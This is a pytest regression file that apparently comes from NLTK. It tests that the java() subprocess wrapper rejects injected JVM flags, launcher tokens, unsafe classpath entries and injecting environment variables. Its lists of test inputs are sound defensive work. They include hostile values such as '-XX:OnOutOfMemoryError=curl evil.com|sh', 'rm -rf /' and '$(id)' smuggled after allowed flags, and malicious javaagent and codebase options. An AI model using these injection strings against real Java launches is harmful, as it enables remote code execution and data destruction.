"""
Regression test for GHSA-m4rf (incomplete fix of CVE-2026-12841, CWE-88).

Two defects are covered:

1. ``config_java()`` validated the *global* java options, but ``java()``'s
   per-call ``options`` parameter reached ``subprocess.Popen`` without
   validation, so a caller could inject a dangerous JVM flag on any
   Stanford/CoreNLP wrapper call. ``java()`` now validates per-call options too.

2. The validator itself blanket-allowed the ``-XX:`` prefix (``-XX:OnError=`` /
   ``-XX:OnOutOfMemoryError=`` are executed as shell commands by the JVM) and all
   ``-D`` system properties (e.g. ``-Djava.ext.dirs``). It is now a minimal
   allowlist of exactly what NLTK and the Stanford CoreNLP docs use: heap/stack
   sizing, ``-verbose``, ``-server``/``-client`` and ``--add-modules``. Anything
   else (including ``-XX:`` and ``-D``) is rejected; a caller that vouches for an
   unlisted flag passes it via ``java(trusted_raw_options=...)``.
"""

import os

import pytest

from nltk import internals


@pytest.fixture
def stub_java_bin(monkeypatch):
    # Avoid config_java()'s binary search so the call reaches option validation.
    monkeypatch.setattr(internals, "_java_bin", "/usr/bin/java")
    monkeypatch.setattr(internals, "_java_options", [])


DANGEROUS = [
    # program-changing / agent / argfile flags
    ["-javaagent:/tmp/evil.jar"],
    ["-agentlib:jdwp=transport=dt_socket"],
    ["-agentpath:/tmp/evil.so"],
    "-Xrunjdwp:transport=dt_socket,server=y",
    ["@/tmp/argfile"],
    ["-jar", "/tmp/evil.jar"],
    # -XX: command-execution flags (JVM runs these on error / OOM) -- verified
    # live: -XX:OnOutOfMemoryError executed the injected command.
    ["-XX:OnError=touch /tmp/pwned"],
    ["-XX:OnOutOfMemoryError=curl evil.com|sh"],
    ["-XX:OnError=/bin/reboot"],
    ["-XX:onerror=reboot"],
    ["-XX:+UnlockDiagnosticVMOptions"],
    ["-XX:ErrorFile=/tmp/e"],
    ["-XX:ParallelGCThreads=1"],  # even a benign -XX: is rejected (use escape hatch)
    # -D system properties: not needed by NLTK/CoreNLP and can load code.
    ["-Dfile.encoding=UTF-8"],
    ["-Djava.ext.dirs=/tmp/evil"],
    ["-Djava.rmi.server.codebase=http://evil/"],
    ["-Djava.system.class.loader=Evil"],
    # module path / module-system flags could point at or open attacker code
    # (only --add-modules with a plain module list is allowed)
    ["--module-path=/tmp/evil"],
    ["-p", "/tmp/evil"],
    ["--add-opens", "java.base/java.lang=ALL-UNNAMED"],
    ["--add-exports", "java.base/sun.misc=ALL-UNNAMED"],
    ["--patch-module", "java.base=/tmp/evil"],
    # boot classpath override -> load attacker classes ahead of the JDK
    ["-Xbootclasspath/a:/tmp/evil.jar"],
    ["-Xbootclasspath:/tmp/evil"],
    # -Xlog / -Xloggc write an attacker-chosen file
    ["-Xlog:gc:file=/tmp/pwned"],
    ["-Xloggc:/tmp/pwned"],
    # case variants must not bypass the (case-insensitive) allowlist match
    ["-JavaAgent:/tmp/evil.jar"],
    ["-AGENTLIB:jdwp=transport=dt_socket"],
    ["-XrunJDWP:x"],
    # --add-modules with a non-module-list value (shell metachars / path)
    ["--add-modules", "java.se.ee; rm -rf /"],
    ["--add-modules", "/etc/passwd"],
    ["--add-modules=;id"],
    # whitespace / control / shell-metachar smuggling on an allowed prefix
    ["-Xmx512m ; rm -rf /"],
    ["-Xmx$(id)"],
    ["-verbose:gc\n-XX:OnError=x"],
    ["-Xmx512m\x00-XX:OnError=id"],
]


@pytest.mark.parametrize("opts", DANGEROUS)
def test_java_per_call_options_reject_injection(stub_java_bin, opts):
    """Per-call dangerous JVM flags must be refused before Popen runs."""
    with pytest.raises(ValueError):
        internals.java(["SomeMainClass"], classpath=".", options=opts)


SAFE = [
    # heap / stack sizing -- everything NLTK's wrappers and CoreNLP docs pass
    ["-Xmx512m"],
    ["-mx4g"],
    ["-mx2g"],
    ["-mx1000m"],
    ["-mx20m"],
    ["-Xmx1024m"],
    ["-Xms128m"],
    ["-Xss4m"],
    ["-server"],
    ["-client"],
    ["-verbose:gc"],
    # --add-modules java.se.ee is required by CoreNLP on JDK 9-11 (both forms)
    ["--add-modules", "java.se.ee"],
    ["--add-modules=java.se.ee,java.xml.bind"],
]


@pytest.mark.parametrize("opts", SAFE)
def test_java_per_call_options_allow_safe(stub_java_bin, opts):
    """The minimal allowlist must accept every flag NLTK and CoreNLP actually
    use. (validate directly; the subsequent Popen would fail on the stub bin.)"""
    internals._validate_java_options(opts)


def test_trusted_raw_options_bypass_validation_but_default_path_does_not(
    stub_java_bin,
):
    """The escape hatch appends caller-vouched flags without validation, while the
    ordinary ``options`` path still rejects the same flag."""
    # options= is validated -> rejected
    with pytest.raises(ValueError):
        internals.java(["Main"], classpath=".", options=["-XX:ParallelGCThreads=1"])
    # trusted_raw_options is NOT validated: it reaches the command (the call then
    # fails at the stub java binary, not at the security gate).
    with pytest.raises(Exception) as exc:
        internals.java(
            ["Main"], classpath=".", trusted_raw_options=["-XX:ParallelGCThreads=1"]
        )
    assert not isinstance(exc.value, ValueError)


# --- cmd (main-class) channel: same launcher-token injection as options -------
# The first cmd token is the Java main class; a launcher switch or @argfile there
# runs an arbitrary JAR / injects JVM args (CWE-88). @argfile is rejected in any
# position because the launcher expands it wherever it appears.

DANGEROUS_CMD = [
    ["-jar", "/tmp/evil.jar"],
    ["@/tmp/argfile"],
    ["-XX:OnError=touch /tmp/pwned", "SomeMainClass"],
    ["SomeMainClass", "@/tmp/argfile"],  # @argfile smuggled into a later position
    ["-Xmx512m", "SomeMainClass"],
    ["-Dfile.encoding=UTF-8", "SomeMainClass"],
    [],  # no main class
    [None],  # non-string first token
    ["", "SomeMainClass"],  # empty first token
    # whitespace-prefixed launcher tokens (a shell/launcher may trim them, and a
    # main class never has surrounding whitespace) must not slip past the guard
    [" -jar", "/tmp/evil.jar"],
    ["\t-jar", "/tmp/evil.jar"],
    ["\n-jar", "/tmp/evil.jar"],
    [" @/tmp/argfile"],
    ["SomeMainClass", " @/tmp/argfile"],
    ["   ", "SomeMainClass"],  # whitespace-only first token
]


@pytest.mark.parametrize("cmd", DANGEROUS_CMD)
def test_java_cmd_channel_rejects_launcher_tokens(stub_java_bin, cmd):
    """A launcher switch / @argfile supplied through the cmd channel must be
    refused before Popen, mirroring the options-channel guard."""
    with pytest.raises(ValueError):
        internals.java(cmd)


def test_java_cmd_channel_allows_legitimate_main_class(stub_java_bin):
    """A real main class followed by "-" program args (Stanford wrappers pass
    -loadClassifier / -textFile) is not a violation: it clears the cmd guard and
    only fails later at the (stub) java binary, never with ValueError."""
    with pytest.raises(Exception) as exc:
        internals.java(
            [
                "edu.stanford.nlp.ie.crf.CRFClassifier",
                "-loadClassifier",
                "model.ser.gz",
                "-textFile",
                "/input.txt",
            ]
        )
    assert not isinstance(exc.value, ValueError)


class _PopenIntercept(Exception):
    """Raised by the fake Popen so the launcher command can be inspected without
    ever executing a real process."""


def test_option_validator_is_load_bearing(stub_java_bin, monkeypatch):
    """Mutation test: with the per-call option validator in place a dangerous flag
    is rejected before Popen is ever constructed; neuter the validator and the
    SAME flag flows straight into the launcher command line -- proving the
    validator (not some later check) is what contains the injection (CWE-88)."""
    captured = {}

    def _fake_popen(cmd, *args, **kwargs):
        captured["cmd"] = list(cmd)
        raise _PopenIntercept

    monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
    danger = "-XX:OnError=touch /tmp/pwned"

    # validator ON: refused before any process is spawned
    with pytest.raises(ValueError):
        internals.java(["SomeMainClass"], options=[danger])
    assert "cmd" not in captured

    # validator neutered: the dangerous flag reaches the launcher command
    monkeypatch.setattr(internals, "_validate_java_options", lambda opts: None)
    with pytest.raises(_PopenIntercept):
        internals.java(["SomeMainClass"], options=[danger])
    assert danger in captured["cmd"], captured


UNICODE_WS_CMD = [
    ["\xa0-jar", "/tmp/evil.jar"],  # NBSP-prefixed launcher switch
    [" @/tmp/argfile"],  # en-quad-prefixed @argfile
    ["　-version"],  # ideographic-space-prefixed switch
]


@pytest.mark.parametrize("cmd", UNICODE_WS_CMD)
def test_java_cmd_channel_rejects_unicode_whitespace_prefix(stub_java_bin, cmd):
    """str.strip() removes Unicode whitespace too, so a NBSP/en-quad-prefixed
    launcher token cannot slip past the main-class guard."""
    with pytest.raises(ValueError):
        internals.java(cmd)


# --- classpath channel: only absolute jars inside a trusted data root ----------


@pytest.fixture
def trusted_jar(tmp_path, monkeypatch):
    """A real .jar inside a temporary trusted data root (on nltk.data.path), so
    _verify_jar_sandbox accepts it and the per-entry checks can be exercised."""
    import nltk.data

    root = tmp_path / "nltk_data"
    root.mkdir()
    jar = root / "good.jar"
    jar.write_bytes(b"PK\x03\x04")
    # Trusted roots = exactly this dir, so the sandbox checks are deterministic.
    monkeypatch.setattr(nltk.data, "path", [str(root)])
    return str(jar)


class TestJavaClasspathSandbox:
    """A caller-supplied classpath reaches ``-cp``. An empty element (``a.jar::`` /
    ``:a.jar`` / ``a.jar::b.jar`` / ``""`` in a list) is the JVM's spelling of the
    current working directory, so it would inject classes from CWD past the jar
    sandbox; it must be refused (CWE-88), as must relative, out-of-root, symlinked
    and @argfile entries."""

    def test_empty_classpath_entry_is_refused(self, stub_java_bin, trusted_jar):
        sep = os.pathsep
        for bad in (
            trusted_jar + sep + sep,  # trailing ::
            sep + trusted_jar,  # leading :
            trusted_jar + sep + sep + trusted_jar,  # empty middle
            [trusted_jar, ""],  # empty list entry
            [trusted_jar, None],  # non-string list entry
        ):
            with pytest.raises((ValueError, internals.UntrustedJarError)):
                internals.java(["Main"], classpath=bad)

    def test_entry_embedding_path_separator_refused(self, stub_java_bin, trusted_jar):
        """A single list entry that embeds os.pathsep would pass the per-entry root
        check as one path but re-split in the JVM into extra unverified elements
        (out-of-root jar or empty CWD element); it must be refused."""
        sep = os.pathsep
        for bad in (
            [trusted_jar + sep],  # trailing separator -> empty CWD element
            [trusted_jar + sep + os.path.realpath(os.sep + "etc")],  # out-of-root
            [trusted_jar + sep + sep],  # smuggled empty CWD element
        ):
            with pytest.raises(internals.UntrustedJarError):
                internals.java(["Main"], classpath=bad)

    def test_relative_classpath_refused(self, stub_java_bin):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath="relative.jar")

    def test_outside_root_classpath_refused(self, stub_java_bin, trusted_jar):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath=os.path.realpath(os.sep + "etc"))

    def test_symlink_escape_refused(self, stub_java_bin, trusted_jar, tmp_path):
        outside = tmp_path / "outside.jar"
        outside.write_bytes(b"PK\x03\x04")
        link = os.path.join(os.path.dirname(trusted_jar), "link.jar")
        try:
            os.symlink(str(outside), link)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported here")
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath=link)

    def test_argfile_classpath_refused(self, stub_java_bin):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath="@/tmp/argfile")

    def test_legit_trusted_jar_reaches_cp_without_empty(
        self, stub_java_bin, trusted_jar, monkeypatch
    ):
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["cmd"] = list(cmd)
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"], classpath=trusted_jar)
        cp_value = captured["cmd"][captured["cmd"].index("-cp") + 1]
        assert cp_value == trusted_jar
        assert "" not in cp_value.split(os.pathsep), cp_value

    def test_empty_entry_guard_is_load_bearing(
        self, stub_java_bin, trusted_jar, monkeypatch
    ):
        """Mutation: neuter the sandbox and the empty CWD element flows into -cp."""
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["cmd"] = list(cmd)
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        monkeypatch.setattr(internals, "_verify_jar_sandbox", lambda entries: None)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"], classpath=trusted_jar + os.pathsep + os.pathsep)
        cp_value = captured["cmd"][captured["cmd"].index("-cp") + 1]
        assert "" in cp_value.split(os.pathsep), cp_value


# --- environment channel: JVM-injecting variables must be stripped -------------


class TestJavaEnvironmentSanitization:
    """The JVM reads JAVA_TOOL_OPTIONS / _JAVA_OPTIONS / JDK_JAVA_OPTIONS as extra
    flags and CLASSPATH as extra code, none of which the allowlist/sandbox sees.
    java() must strip them from the child environment (CWE-88 defense in depth)."""

    INJECTING = ("JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS", "CLASSPATH")

    @staticmethod
    def _capture_env(monkeypatch):
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["env"] = k.get("env")
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        return captured

    def test_injecting_env_vars_stripped(self, stub_java_bin, monkeypatch):
        for var in self.INJECTING:
            monkeypatch.setenv(var, "-XX:OnError=touch /tmp/pwned")
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        env = captured["env"]
        assert env is not None, "java() must pass an explicit, sanitized env"
        for var in self.INJECTING:
            assert var not in env, f"{var} leaked into the child JVM environment"

    def test_benign_env_preserved(self, stub_java_bin, monkeypatch):
        monkeypatch.setenv("NLTK_TEST_MARKER", "keepme")
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        assert captured["env"].get("NLTK_TEST_MARKER") == "keepme"
        assert "PATH" in captured["env"]

    def test_env_strip_is_load_bearing(self, stub_java_bin, monkeypatch):
        """Mutation: empty the strip set and the injecting var reaches the child."""
        monkeypatch.setenv("JAVA_TOOL_OPTIONS", "-XX:OnError=x")
        monkeypatch.setattr(internals, "_JVM_INJECTING_ENV_VARS", frozenset())
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        assert "JAVA_TOOL_OPTIONS" in captured["env"]
